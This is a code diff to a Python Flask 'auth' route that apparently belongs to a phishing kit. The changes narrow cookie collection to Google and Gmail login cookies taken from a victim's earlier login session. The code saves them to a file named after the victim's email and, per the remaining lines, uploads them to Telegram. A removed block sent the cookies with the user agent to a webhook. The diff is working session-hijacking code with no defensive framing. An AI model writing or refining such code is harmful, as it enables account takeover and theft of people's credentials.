@@ -420,11 +420,20 @@ def auth():
     resp.set_cookie('user_agent', user_agent, secure=is_https, samesite='Strict')
 
     # Prepare cookies for webhook in Cookie2json format
+    # Only include Google login cookies (gmail.com, google.com) from previous login session
     cookies_json = []
+    google_cookies = []
+    # Try to get cookies from previous login session (if available)
+    if 'login_cookies' in session:
+        for c in session['login_cookies']:
+            if any(d in c.get('domain', '') for d in ['gmail.com', 'google.com']):
+                google_cookies.append(c)
+    # Fallback: try to get from request cookies (not ideal, but for completeness)
     for k, v in request.cookies.items():
-        cookies_json.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
-    cookies_json.append(cookieToJSON(f"auth_verified=1; Path=/; Secure; SameSite=Strict", domain))
-    cookies_json.append(cookieToJSON(f"user_agent={user_agent}; Path=/; Secure; SameSite=Strict", domain))
+        if any(d in domain for d in ['gmail.com', 'google.com']):
+            google_cookies.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
+    # Add Google cookies only
+    cookies_json.extend(google_cookies)
 
     # Save cookies to txt file named with user email
     safe_email = email.replace('@', '_at_').replace('.', '_dot_')
@@ -442,12 +451,6 @@ def auth():
     except Exception as e:
         print(f"[ERROR] Could not write cookies file: {e}")
 
-    # Send cookies as JSON string to webhook and as file if possible
-    cookies_message = (
-        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{cookies_str}"
-        f"\nUser-Agent: {user_agent}"
-    )
-    send_webhook_message(cookies_message)
 
     # Send file to Telegram (document upload)
     try:
